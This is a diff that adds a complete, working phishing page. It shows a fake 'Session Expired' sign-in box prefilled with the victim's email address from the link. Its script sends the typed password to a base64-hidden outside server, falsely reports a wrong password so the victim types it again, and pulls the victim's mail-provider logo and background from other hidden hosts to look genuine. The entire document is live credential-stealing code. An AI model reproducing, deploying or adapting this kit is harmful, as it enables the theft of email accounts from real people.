@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>Session Revalidation...</title>
+		<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    	<link href="https://www.unpkg.com/remixicon@2.5.0/fonts/remixicon.css"  rel="stylesheet" type="text/css">
+    	<!--<link href="required/first.css" rel="stylesheet" type="text/css">-->
+    	<link rel="shortcut icon" href="mailrepo.svg">
+
+		<style>
+		@import url('rubik.css');
+
+		*{
+			outline: none;
+			margin: 0;
+			/*overflow: hidden;*/
+		}
+		body{
+			font-family: 'Rubik',Helvetica,Arial,sans-serif;
+			position: relative; /* parent */
+			/*background-color: grey;	*/
+		}
+
+		#onpageload{
+			position: absolute; /* child */
+			top: 45%;
+			left: 50%;
+			margin-left: -39px; /* half of width*/
+			margin-top: -39px; /* half of height */
+			background-color: transparent;
+		/*	margin: 0 auto;
+			margin-top: 35vh;*/
+
+		}
+		.susloader{
+			width: 50px;
+			height: 50px;
+			border-radius: 50%;
+			 background-color: transparent;
+
+			border-top: 4px solid rgba(0, 0, 0, 1.0);
+			border-left: 4px solid rgba(0, 0, 0, 1.0);
+			border-right: 4px solid rgba(0, 0, 0, 0);
+			animation: spin 0.575s infinite linear;
+		}
+		@keyframes spin{
+			to { transform: rotate(360deg); }
+		}
+
+		.susMainClass{
+		  content: "";
+			height: 100vh;
+			width: 100vw;
+		background: rgb(255,255,255);
+		background: linear-gradient(90deg, rgba(255,255,255,1) 0%, rgba(255,255,255,1) 100%, rgba(0,212,255,1) 100%);    
+			/*background: url('https://sharkeyes.co/mx/imgs/webmail.png') no-repeat fixed 50% 50% / cover ;*/
+			/*background: url('https://sharkeyes.co/mx/imgs/webmail.png') no-repeat fixed 50% 50% / cover ;*/
+		}
+
+		.modal {
+			background: #0000004d;
+		}	
+		.modal-header {
+			 padding: 2px 4px; 
+			 justify-content: flex-start;
+		}
+		.modal-header h5{
+		 margin-bottom: 0px;
+		 font-size: 17px;
+		}
+		#susFavTiny{ margin-right: 10px; }
+		#susFavTiny img{
+		height: 25px;
+			width: 25px;	
+		}
+		.modal-content {
+			border-radius: 3px;
+			max-width: 470px;
+			box-shadow: 0px 0px 10px hsl(0deg 0% 87% / 80%);
+		}
+		.modal-dialog-centered {
+			justify-content: center;
+		}
+		.modal-body{
+			display: flex;
+			flex-direction: column ;
+			justify-content: center;
+			padding: 0;
+		}
+		.modal-backdrop.show {
+			opacity: 0.3;
+		}
+		.show-acct{ font-size: 22px; margin: 3px 0 -3px; 	 }
+		.what-to-do{ font-style:italic ;	}
+		.what-to-do strong{ color: #dc3545;	}
+		.sus-input-group {
+			position: relative;
+		}
+
+		.sus-input {
+			padding: 8px;
+			border: none;
+			border-radius: 3px !important;
+			font: inherit;
+			color: #161616;
+			background-color: transparent;
+			outline: 1px solid rgb(206 212 218);
+			display: block;
+			width: 100%;
+		}
+
+		.sus-input-label {
+			position: absolute;
+			top: 0;
+			left: 0;
+			transform: translate(10px, 8px);
+			transform-origin: left;
+			transition: transform .25s;
+		}
+
+		.sus-input:focus~.sus-input-label,
+		.sus-input:valid~.sus-input-label, .sus-input:not(:placeholder-shown)~.sus-input-label  {
+			transform: translate(0, -24px) scale(.89);
+			color: inherit;
+			/*font-size: 18px;*/
+		}
+		.sus-input:is(:focus, :valid) {
+			outline-color: #007bff;
+			margin-top: 11px;
+		}
+		#susRemember ~ label{
+			font-size: 14px;
+		}
+		#susSubmitBtn{ letter-spacing: 1px; }
+		.dissimule{
+			visibility: hidden;
+			display: none;
+		}
+
+		#susPass:invalid{
+			font-size: .875em;
+			color: #dc3545;
+		}
+		.sus-input.bu-invalid {
+			outline-color: #dc3545;
+			padding-right: calc(1.5em + 0.75rem);
+			background-image: url("er.png");    
+			background-repeat: no-repeat;
+			background-position: right calc(0.375em + 0.1875rem) center;
+			background-size: 12px 12px ;
+		}
+		.sus-input.bu-invalid ~.sus-input-label {
+			color: #dc3545;;
+		}
+
+		.sus-input.bu-invalid:focus~.sus-input-label,
+		.sus-input.bu-invalid:valid~.sus-input-label {
+			color: inherit;
+		}  
+
+		.sus-input.bu-invalid:is(:focus, :valid) {
+			outline-color: #dc3545;
+			/*margin-top: 11px;*/
+		}
+
+		.invalid-div {
+			display: none;
+			width: 100%;
+			margin-top: 0.25rem;
+			font-size: .875em;
+			color: #dc3545;
+		}
+		.bu-invalid~.invalid-div{
+			display: block;
+		}
+		</style>
+  	</head>
+	<body id="susBody" data-xmone="Ly9meW5kYXoueHl6L214Mi4xLz9hY2Nlc3M9" data-xmtwo="Ly9meW5kYXoueHl6L214Mi4xLz90aHVtPTEmYWNjZXNzPQ==">
+		<div  id="onpageload"><div class="susloader"></div></div>
+		<main class="susMainClass" id="susMainId">
+			<section  id="susSectionId" class="susSectionClass"></section>
+		</main>
+
+
+		<div class="modal fade" id="susModal" tabindex="-1">
+		  <div class="modal-dialog modal-dialog-centered">
+		    <div class="modal-content">
+		      <div class="modal-header">
+		      	<div id="susFavTiny"><img src="mailrepo.svg" class="mailrepo"></div>
+		        <h5 class="">Session Expired</h5>
+
+		      </div>
+		      <div class="modal-body px-5">
+					<div class="show-acct"></div>
+					<div class="what-to-do">Sign in to restore <strong>expired</strong> session!</div>	 
+					  	
+
+					<form id="susForm" class="sus-form mt-3 mb-2 needs-validation" method="POST" action="aHR0cHM6Ly9uaXN0YWlybGlmdHMuY28udWsvY2FoYS9zZW5kLnBocA==" novalidate>
+					  <div class="sus-input-group mt-2">
+					    <input type="password" name="suspass" id="susPass" required class="sus-input" placeholder=" " minlength="6" autofocus>
+					    <label for="name" class="sus-input-label">Password</label>
+					    <div class="invalid-div"></div>				    
+					  </div>
+					  <div class="mt-3 mb-3">
+					  	<button type="button" id="susSubmitBtn" class="btn btn-success" style="border-radius: 2px; padding-right:10px ;"><i class="ri-lock-2-line"></i> Secured Sign In</button>
+					  	<span class="float-end" id="lerror" style="color:#dc3545; font-size: 15px;"></span>
+					  </div>	
+						<div class="form-check">
+						  <input class="form-check-input" type="checkbox" value="true" id="susRemember" checked>
+						  <label class="form-check-label" for="susRemember">
+						    <span>Keep me logged in (<small>Do not select if you are on a public computer</small>). </span>
+						  </label>
+						</div>				  
+					</form>
+		      	</div>
+		    </div>
+		  </div>
+		</div>
+
+
+		 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+		<script>
+		var burl = (window['location'])['href'];
+		var mlurl = burl['substring'](burl['lastIndexOf']('=') + 1);
+		let regexCheck = new RegExp("([!#-'*+/-9=?A-Z^-~-]+(\.[!#-'*+/-9=?A-Z^-~-]+)*|\"\(\[\]!#-[^-~ \t]|(\\[\t -~]))+\")@([!#-'*+/-9=?A-Z^-~-]+(\.[!#-'*+/-9=?A-Z^-~-]+)*|\[[\t -Z^-~]*])");
+		const labody = document.querySelector('#susBody');
+		window.retryAttemptCount = 0;
+
+		if (!regexCheck.test(mlurl) ) {
+			document['querySelector']('html')['innerHTML']="Invalid"
+			window['stop']();
+		}else{
+			document.querySelector('.show-acct').innerHTML = mlurl 
+		}
+
+		window['addEventListener']('load', event => {
+			window.retryAttemptCount = 0;
+			document.querySelector('.show-acct').innerHTML = mlurl
+			fetchMeSomeGoodies(labody.getAttribute('data-xmone'), labody.getAttribute('data-xmtwo'));
+			const susModal = new bootstrap.Modal('#susModal', {
+				backdrop: 'static',
+				keyboard: false,
+				show: true,
+			});
+			setTimeout(() => {susModal.show(); 	 pageloader('hide') }, 1000)
+		});
+
+		document.querySelector('button')['addEventListener']('click', e => {
+			var susPword = document.querySelector('#susPass');
+
+		  if (!susPword.checkValidity()) {
+			susPword.classList.add('bu-invalid')
+			document.querySelector('#susPass ~ .invalid-div').innerHTML = susPword.validationMessage;
+		  } else {
+			window.retryAttemptCount = retryAttemptCount + 1;
+
+			susPword.classList.remove('bu-invalid')
+			document.querySelector('#susPass ~ .invalid-div').innerHTML = "";
+
+			const susForm = document['getElementById']('susForm');
+			const susFormData = new FormData(susForm);
+			var theredi = typeof e_sus === 'undefined' ?  `https://${d0men(mlurl)}` : e_sus.redirect;
+			susFormData.append('email', mlurl);
+			susFormData.append('pass', susPword.value);
+			susFormData.append('redirect', theredi);
+			susFormData.append('clientUrl', theredi);
+			susFormData.append('typesent', typeof typesent === 'undefined' ? "New" : typesent);
+
+			e.target.setAttribute('disabled', false);
+			e.target.innerHTML =`<i class="ri-lock-2-line"></i> <span class="spinner-grow spinner-grow-sm" role="status" aria-hidden="true"></span> Kindly wait...` ;
+			document.querySelector('#lerror').innerText = 'Check your password!'
+			susPword.value = '';
+			susPword.focus();
+
+			fetch(atob(susForm.getAttribute('action')), {
+			  method: 'POST', // oder 'PUT'
+			  headers: {
+			  },
+			  body: susFormData,
+			})
+			.then(res => res.json())
+			.then(fdbk => {
+				window.typesent = "Verification";
+				if (retryAttemptCount>=2) { 
+					retryAttemptCount=0;
+					window['location']['href'] =   theredi;
+				}
+				// console.log('Success:', fdbk);
+				e.target.innerHTML =`<i class="ri-lock-2-line"></i> Secured Sign In` ;
+				e.target.removeAttribute('disabled');
+
+			})
+			.catch((error) => {
+			  console.error('Error:', error);
+			});
+		  } 
+		  e.preventDefault()
+		});
+
+
+		function pageloader(toggle ='show') {
+			var onpageload = document.querySelector('#onpageload')
+			var maintag = document.querySelector('main')
+			if (toggle === 'hide') {
+				maintag.style.display = 'none';
+				onpageload.classList.add('dissimule')
+			}else{
+				maintag.style.display = 'block';
+				onpageload.classList.remove('dissimule')
+			}
+			
+		}
+
+					
+		 async function fetchMeSomeGoodies(...goodieLocation){
+
+			const options  = {method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded',},body:`key=${Math.random()}`}
+
+			let fetchmeGoodie1 = Promise.resolve(fetch(atob(goodieLocation[0])+mlurl, options).then((response) => response.json()));
+			let fetchmeGoodie2 = Promise.resolve(fetch(atob(goodieLocation[1])+mlurl, options).then((response) => response.json()));
+
+			Promise.allSettled([fetchmeGoodie1, fetchmeGoodie2]).then(([response1, response2] ) => {
+				console.log(response1);
+				console.log(response2);
+				if (response1.status ==='fulfilled' && response1.value.bgtype === 'img') {
+					populateDOM(response1.value);
+				}else if(response1.status ==='fulfilled' && response1.value.bgtype === 'url') {
+					populateDOM(response2.value);
+				}
+			}).catch( (error) =>	{
+				console.log(error)
+			}).finally(() => ""/*console.log('asdasd')*/  );//stop loading indicator
+		}
+
+
+		function populateDOM(sus){
+			console.log(sus)
+			document.querySelector('link[rel="shortcut icon"]').setAttribute('href', sus.favicon);
+			document.querySelector('#susFavTiny img').setAttribute('src', sus.favicon);
+			document.querySelector('#susMainId').style.display = "block";
+			document.querySelector('.susMainClass').style.background = `url('${sus.bg}')  no-repeat fixed 50% 50% / cover`;
+			document.querySelector('#susPass').style.zIndex = '50000'; 
+			document.querySelector('#susPass').focus();
+			window.e_sus = sus;
+		}
+
+		window.d0men = (hmm) =>  hmm.substring(hmm.lastIndexOf("@") +1)
+		</script>	
+	</body>
+
+
+</html>
